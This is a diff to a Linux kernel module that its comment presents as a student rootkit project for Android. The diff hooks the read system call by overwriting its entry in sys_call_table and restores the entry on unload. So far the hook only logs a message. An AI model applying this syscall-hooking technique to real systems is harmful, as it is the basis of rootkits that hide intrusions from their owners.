@@ -5,11 +5,22 @@
 
   End of studies' project based on "Android platform based linux kernel rootkit".
 */
-
 #include <linux/kernel.h>
 #include <linux/module.h>
 
+#include <linux/unistd.h> // hooked functions: read
+#include <linux/types.h>  // size_t
+
 unsigned long *sys_call_table = 0;
+
+asmlinkage ssize_t (*og_read) (int fd, void *buf, size_t count);
+
+asmlinkage ssize_t
+hooked_read(int fd, void *buf, size_t count)
+{
+  printk(KERN_INFO "syscall read has been hooked!\n");
+  return og_read(fd, buf, count);
+}
 
 void 
 get_sys_call_table()
@@ -39,6 +50,13 @@ root_start(void)
 {
   printk(KERN_INFO "Hello word!\n");
   get_sys_call_table();
+  
+  if (sys_call_table != 0x0)
+  {
+    og_read = sys_call_table[__NR_read];
+    sys_call_table[__NR_read] = hooked_read;
+  }
+
   return 0;
 }
 
@@ -46,6 +64,10 @@ static int __exit
 root_stop(void)
 {
   printk(KERN_INFO "Goodbye!\n");
+  if (sys_call_table != 0x0)
+  {
+    sys_call_table[__NR_read] = og_read;
+  }
   return 0;
 }
 
